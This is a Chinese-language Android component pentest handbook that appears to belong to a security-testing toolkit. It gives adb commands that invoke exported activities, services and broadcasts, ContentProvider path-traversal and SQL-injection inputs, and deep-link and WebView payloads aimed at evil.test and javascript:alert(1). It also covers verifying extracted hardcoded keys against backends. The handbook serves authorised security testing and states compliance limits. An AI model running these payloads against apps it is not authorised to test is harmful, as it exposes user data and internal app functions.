# Android 组件安全审计手册（Android Component Audit）

> 适用版本：v5.10.0 起
> 覆盖：导出组件越权 · Intent 重定向 · PendingIntent 劫持 · WebView 桥 ·
> ContentProvider 路径穿越/SQL 注入/未授权读写 · Binder/AIDL 权限校验缺失 ·
> Deep Link 劫持与参数注入 · 硬编码密钥 · 组件面清单。
>
> ⚠️ **合规红线**：仅测试**自有 App** 或**已获书面授权**的目标（含 SRC 公告范围）。
> 不得对第三方应用商店的 App 做未授权逆向、抓包或组件调用。
> 测试设备优先使用自己的测试机/模拟器，不得在他人设备上执行 ADB 命令。

---

## 0. 定位

组件安全的特殊性在于：**漏洞在"没有认证的入口"，危害在"被拉起的内部功能"**。

Android 的应用边界由 `exported` 与自定义 `permission` 两个开关决定：

| exported | 有自定义 permission | 结果 |
|---|---|---|
| true | 无 | **任何人可调用 → 高危** |
| true | 有 | 需持有该权限的 App 才能调用（需确认 permission 的 protectionLevel） |
| false | — | 仅同应用/同 UID 可调用 |
| 未声明 | 无 | Android 12+ 默认不导出；**旧系统**有 intent-filter 则默认导出 |

> **注意 permission 的 protectionLevel**：若为 `normal`，任何应用只要在
> Manifest 里声明即可获得 → 等同于无保护。这是最容易被误判"已保护"的情形。

---

## 1. 前置准备

### 1.1 工具

| 工具 | 用途 | 是否需 Root |
|---|---|---|
| `adb` | 组件调用、数据读取、日志 | 否 |
| `apk_recon.py`（本项目） | 秒级组件矩阵 + 密钥/端点速筛 | 否 |
| `dumpsys` / `pm` | 运行时组件与权限实况 | 否 |
| drozer（agent 通过 adb install） | 系统化组件测试框架 | **否**（agent 是普通 App） |
| Frida / objection | 动态 Hook、绕过 SSL Pinning | 通常否（Frida-server 便携版需 root，或用非 root 方案） |
| `jadx` / `apktool` | 反编译看代码 | 否 |

### 1.2 建立组件矩阵

```bash
# 1) 静态：从 APK 直接拿组件面（秒级，不反编译）
python3 scripts/apk_recon.py target.apk --json recon.json

# 2) 动态：从已安装的 App 拿运行时实况（最准，含系统合并后的属性）
adb shell dumpsys package <包名> | grep -E "Activity|Service|Receiver|Provider|permission"
adb shell cmd package resolve-activity --brief <包名>

# 3) 当前前台组件（确认包名与类名）
adb shell dumpsys activity activities | grep -E "mResumedActivity|topResumedActivity"
```

**把组件矩阵写进线索板**（`clueboard.py add --section hosts`），
标注每个组件的 `kind / exported / permission / 风险`，避免跨轮重复清点。

---

## 2. 检测清单

### 2.1 导出 Activity 未授权调用

- **构造**：`adb shell am start -n <包名>/<完整类名>`；
  带参：`--es key value` / `--ei num 1` / `-d "<uri>"`。
- **判定**：**无该应用权限的调用成功拉起，且产生实际效果**
  （进入管理页、展示他人数据、执行了动作）。
- **反例**：能拉起但只是空白页 / 仅显示登录页 → 降级为 lead。

```bash
adb shell am start -n com.example.app/com.example.app.AdminActivity
adb shell am start -n com.example.app/.InternalActivity --es userId 1002
```

### 2.2 导出 Service 未授权启动

- **构造**：
  ```bash
  adb shell am startservice -n <包名>/<服务类>          # Android 7 及以前
  adb shell am start-foreground-service -n <包名>/<服务类>  # Android 8+
  ```
- **判定**：服务被拉起并执行了本应受限的逻辑（抓 logcat 看副作用：
  `adb logcat -s <TAG>`）。
- **反例**：启动返回 "not exported" / 权限拒绝。

### 2.3 导出 BroadcastReceiver 伪造广播

- **构造**：
  ```bash
  adb shell am broadcast -n <包名>/<接收器类> -a com.example.ACTION --es cmd "reset"
  adb shell am broadcast -n <包名>/<接收器类> -a com.example.ACTION --ez isVip true
  ```
- **判定**：接收器响应了外部广播并改变了状态（余额、VIP 标记、配置）。
- **反例**：广播被投递但业务无变化。

### 2.4 ContentProvider 未授权读写 / 路径穿越

- **构造**：
  ```bash
  adb shell content query --uri content://<authorities>/<path>
  adb shell content query --uri content://<authorities>/<path> --where "1=1"
  adb shell content read  --uri content://<authorities>/<path>/<file>
  adb shell content insert --uri content://<authorities>/<path> --bind col:s:val
  ```
  路径穿越：把 `<file>` 换成 `../../../../data/data/<包名>/shared_prefs/x.xml`
  或 `/sdcard/...`，观察是否读到提供者目录之外的文件。
- **判定**：读到**他人/非本应用**的数据，或穿越到 provider 根目录之外。
- **反例**：返回 "Permission Denial" / "Unknown URI"。

> SQL 注入：在 `--where` 中尝试 `1=1`、`1=1)--`、`(SELECT ...)`，
> 对比返回行数变化即为注入证据（**只读、限定条数**）。

### 2.5 Intent 重定向 / 隐式 Intent 劫持

- **构造**：构造一个 Intent 指向导出组件，让其内部 `startActivity`
  跳到攻击者指定的目标；典型是 `intent://` 或 `android.intent.action.VIEW` 转发。
- **判定**：成功跳转到**应用内部未导出的页面**并携带可控参数。

```bash
adb shell am start -n com.example.app/.RouterActivity \
  -d "com.example.app://internal/admin?from=evil"
```

### 2.6 PendingIntent 劫持

- **构造**：静态检查 `PendingIntent.getActivity/getService/getBroadcast`
  是否使用 `FLAG_MUTABLE` 且 base Intent 为空/可被填充。
  动态验证需构造可劫持场景（第三方 App 填充 `setComponent`）。
- **判定**：第三方可改写 PendingIntent 的最终目标并触发。
- **反例**：使用 `FLAG_IMMUTABLE`（现代做法）→ 直接记录为"已缓解"。

### 2.7 WebView 不安全配置

- **静态检查**：`addJavascriptInterface`、`setAllowFileAccess(true)`、
  `setAllowUniversalAccessFromFileURLs(true)`、`setJavaScriptEnabled(true)` +
  可加载外部 URL。
- **构造**：
  ```bash
  # 让 WebView 打开带 JS 的页
  adb shell am start -n com.example.app/.WebActivity -d "https://evil.test/x.html"
  # 或直接 file:// 读本地
  adb shell am start -n com.example.app/.WebActivity -d "file:///sdcard/evil.html"
  ```
- **判定**：JS 桥被调用并产生实际效果（读文件、发请求、拿到内部数据）。
- **反例**：仅"存在 addJavascriptInterface"，未证明可被外部页面触达。

### 2.8 Binder / AIDL 服务越权

- **静态检查**：`onBind` 是否校验 `getCallingUid()` / 包名 / 权限；
  若直接 `return binder` 且服务自身不导出则可低危。
- **判定**：低权限 App（或 adb shell）调用了高权限服务方法并得到数据/效果。
- **工具**：drozer 的 `app.service.info` / `app.service.send`。

### 2.9 Deep Link 劫持与参数注入

- **构造**：
  ```bash
  adb shell am start -a android.intent.action.VIEW -d "appscheme://path?url=https://evil.test"
  adb shell am start -a android.intent.action.VIEW -d "appscheme://webview?url=javascript:alert(1)"
  ```
- **判定**：跳转到任意页面 / 动态加载外部 URL / 参数被用作 WebView 地址或文件路径。
- **反例**：scheme 存在但参数被白名单校验。

### 2.10 硬编码密钥（最高优先级）

- **构造**：`apk_recon.py` 速筛命中后，取出密钥**实际调用后端接口**。
- **判定**：密钥能调通后端并返回真实数据（未过期的 key、可用的 access token）。
  仅"包里有个疑似 key"不算。
- **注意**：这是**最容易出成果**的一类，且**不需要 root、不需要真机**
  （HTTP 请求即可验证）。

### 2.11 组件面清单（信息层）

- 把完整组件矩阵 + 权限清单归档，标注导出/保护状态。
- 单独提交价值低，但它是**其余各项的输入**，也是"测试完整性"的证明。

---

## 3. 无 Frida / 无 Root 的降级验证路径

这是真实交付中最常见的前置条件。以下手段**全部不需要 root**：

| 场景 | 降级手段 |
|---|---|
| 组件调用 | `adb shell am` / `content` 命令（系统自带，无需 root） |
| 读取私有数据 | 包 `debuggable=true` 时用 `adb shell run-as <包名> cat files/x` |
| 动态 Hook | Frida **非 root** 方案；或用 drozer（普通 App 安装） |
| SSL Pinning | 无 root 时用 `apk-mitm` 重打包（改 networkSecurityConfig 后重签）；或改测 Web 端 |
| 抓包 | 系统代理 + 用户证书（Android 7+ 需 App 信任用户证书，否则需重打包） |
| 反调试/反Hook | 先静态定位检测逻辑，再针对绕过（需重打包而非 Hook） |

**报告要求**：若因无 Root 无法完成某些验证，必须在报告"限制与缓解"中写明
**哪一步没做、为什么、需要什么条件**，不得含糊跳过。

---

## 4. 与既有模块的复用

| 目标 | 复用 | 说明 |
|---|---|---|
| 组件面与密钥速筛 | `scripts/apk_recon.py` | 秒级，先跑它再决定深挖方向 |
| 密钥调后端验证 | `httpRequest` / `curl` | 与 Web 域完全一致 |
| 接口越权（App 后端 API） | `business_logic.py ab` / `judge` | 与 Web IDOR 同一硬标准 |
| 反编译产物的代码审计 | 手工审计 + `vuln_detector.py` | 输入点 → 传播链 → Sink |
| 记忆 | `clueboard.py`（hosts 区块放组件矩阵） | 组件矩阵跨轮存活 |
| 交付 | `report_docx.py` | 同一验证门 |

---

## 5. 过门口径

| 类型 | 责任字段 | 说明 |
|---|---|---|
| `android_component_exposure` | `adb_repro_cmd` + `effect_proof` | **ADB 可复现命令 + 实际效果**；"组件导出但无效果"不得作为 finding |
| `hardcoded_secret` | `secret_usable_proof` / `api_call_proof` | 密钥能实际调通后端（复用 v5.9 命门） |
| `webview_bridge` | `execute_proof` / `file_content_proof` | 桥被调用的实际效果 |
| `content_provider_exposure` | `cross_app_data_proof` / `path_traversal_proof` | 读到非本应用数据或穿越出根目录 |

> **硬要求**：组件类 finding 的证据必须包含**可复制粘贴的 ADB 命令**与
> **执行后的实际效果**（截图或响应体）。仅有"该组件 exported=true"= lead。

---

## 6. 合规

1. 反编译产物（`unpacked/`）不入库、不公开，仅记脱敏结论。
2. 测试 App 数据时**只读、限定条数**；不得导出真实用户数据。
3. 测试完成后卸载测试 App、清理测试期间写入的 Provider 数据与广播副作用。
4. 第三方应用商店 App 的未授权逆向属违规，仅在你自有或授权范围内操作。

---

结束。组件矩阵提取见 `scripts/apk_recon.py`；有壳请配合 `references/apk_reversing.md`。
